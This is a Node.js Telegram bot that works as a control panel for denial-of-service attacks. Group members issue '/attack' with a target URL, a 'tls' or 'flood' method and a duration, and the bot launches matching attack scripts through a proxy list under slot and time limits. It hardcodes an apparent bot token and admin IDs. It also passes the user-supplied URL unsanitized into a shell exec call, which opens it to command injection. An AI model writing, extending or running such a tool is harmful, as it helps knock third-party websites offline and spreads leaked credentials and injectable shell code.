const TelegramBot = require('node-telegram-bot-api');
const Database = require('better-sqlite3');
const token = '7903023411:AAHxE6o_hdibPehD27m1qd9xWnTGYyY_Znc';
const bot = new TelegramBot(token, {polling: true});
const admins = [6601930239, 1848131455];
const groupId = -1002370415846;
const methods = ['tls', 'flood'];
const db = Database('bot.db');
db.exec(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
CREATE TABLE IF NOT EXISTS blacklist (keyword TEXT PRIMARY KEY);`);
const getSetting = db.prepare('SELECT value FROM settings WHERE key=?');
const setSetting = db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
const getAllBlacklist = db.prepare('SELECT keyword FROM blacklist');
const addBlacklist = db.prepare('INSERT OR IGNORE INTO blacklist (keyword) VALUES (?)');
const removeBlacklist = db.prepare('DELETE FROM blacklist WHERE keyword=?');
if (!getSetting.get('maintenance')) setSetting.run('maintenance', 'false');
if (!getSetting.get('activeSlots')) setSetting.run('activeSlots', '0');
setSetting.run('activeSlots', '0');
let maintenance = getSetting.get('maintenance').value === 'true';
let blacklist = getAllBlacklist.all().map(r => r.keyword);
let activeSlots = parseInt(getSetting.get('activeSlots').value);
const maxSlots = 2;
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  bot.sendMessage(chatId, 'Menu: /methods, /attack, /blacklist, /maintenance (admin)');
});
bot.onText(/\/methods/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  bot.sendMessage(chatId, 'Methods: tls, flood');
});
bot.onText(/\/blacklist (add|remove) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!admins.includes(userId)) return;
  const action = match[1];
  const keyword = match[2].trim();
  if (action === 'add') {
    if (!blacklist.includes(keyword)) {
      blacklist.push(keyword);
      addBlacklist.run(keyword);
    }
    bot.sendMessage(chatId, `Added ${keyword} to blacklist`);
  } else if (action === 'remove') {
    blacklist = blacklist.filter(k => k !== keyword);
    removeBlacklist.run(keyword);
    bot.sendMessage(chatId, `Removed ${keyword} from blacklist`);
  }
});
bot.onText(/\/maintenance/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!admins.includes(userId)) return;
  maintenance = !maintenance;
  setSetting.run('maintenance', maintenance ? 'true' : 'false');
  bot.sendMessage(chatId, `Maintenance: ${maintenance ? 'ON' : 'OFF'}`);
});
bot.onText(/\/attack (.+) (tls|flood) (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isAllowed(chatId, userId)) return;
  if (maintenance && !admins.includes(userId)) {
    bot.sendMessage(chatId, 'Bot is under maintenance');
    return;
  }
  const url = match[1];
  const method = match[2];
  let time = parseInt(match[3]);
  if (!methods.includes(method)) {
    bot.sendMessage(chatId, 'Invalid method');
    return;
  }
  if (blacklist.some(k => url.includes(k))) {
    bot.sendMessage(chatId, 'URL is blacklisted');
    return;
  }
  if (!admins.includes(userId) && time > 60) {
    time = 60;
  }
  if (activeSlots >= maxSlots) {
    bot.sendMessage(chatId, 'No slots available');
    return;
  }
  activeSlots++;
  setSetting.run('activeSlots', activeSlots.toString());
  bot.sendMessage(chatId, `Attacking ${url} with ${method} for ${time}s`);
  const { exec } = require('child_process');
  exec(`node ${method}.js ${url} ${time} 36 6 proxy.txt`, (error, stdout, stderr) => {
    activeSlots--;
    setSetting.run('activeSlots', activeSlots.toString());
    bot.sendMessage(groupId, 'A slot is now available');
    if (error) {
      bot.sendMessage(chatId, `Error: ${error.message}`);
    } else {
      bot.sendMessage(chatId, `Attack done: ${stdout}`);
    }
  });
});
function isAllowed(chatId, userId) {
  if (admins.includes(userId)) return true;
  if (chatId !== groupId) return false;
  return true;
}
